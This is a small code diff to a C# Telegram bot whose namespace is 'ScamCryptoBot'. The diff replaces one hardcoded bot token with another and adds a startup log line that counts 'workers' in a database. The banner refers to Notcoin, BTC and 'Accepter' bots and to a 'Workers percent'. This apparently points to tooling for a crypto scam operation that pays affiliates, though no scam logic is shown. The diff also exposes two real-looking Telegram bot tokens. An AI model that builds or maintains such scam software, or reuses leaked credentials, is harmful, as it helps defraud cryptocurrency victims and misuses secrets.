@@ -21,7 +21,7 @@ namespace ScamCryptoBot
             timer.Elapsed += TimerElapsed;
             timer.Start();
 
-            tokenBot = "5887818185:AAFj84SxWV1QVUk4giedExNDID3-_DTiD_U";
+            tokenBot = "7037433641:AAG_Cpv9icgQMbm0AUD5E2zVtCUOvJfQfkM";
 
             telegramClient = new TelegramBotClient(tokenBot);
             receiverOptions = new ReceiverOptions
@@ -42,12 +42,14 @@ namespace ScamCryptoBot
             Console.Title = $"CryptoFerma: {CryptoFermaVersion}";
             PrintColoredText($"[#] Check database.....", ConsoleColor.Cyan);
             await DataBase.LoadFromDataBase();
+            int workersCount = DataBase.UserDataBase.Count;
             PrintColoredText($"[+] Bot sucsessuly startet at: {tokenBot}\n" +
                 $"[+] Version:{CryptoFermaVersion}\n" +
                 $"[#] Admin ID: {LocalConfig.adminMainId}\n" +
                 $"[#] Notcoin Bot status: {notcoinBotStatus}\n" +
                 $"[#] BTC Bot status: {btcBotStatus}\n" +
                 $"[#] Accepter bot status: {accepterBotStatus}\n" +
+                $"[#] Workers in DataBase: {workersCount}\n" +
                 $"[#] Workers percent: {LocalConfig.PercentOfWorkers}%\n" +
                 $"[#] Develop by AM0R3M10: https://t.me/WH3BABY",ConsoleColor.DarkMagenta);
             await Task.Delay(-1);
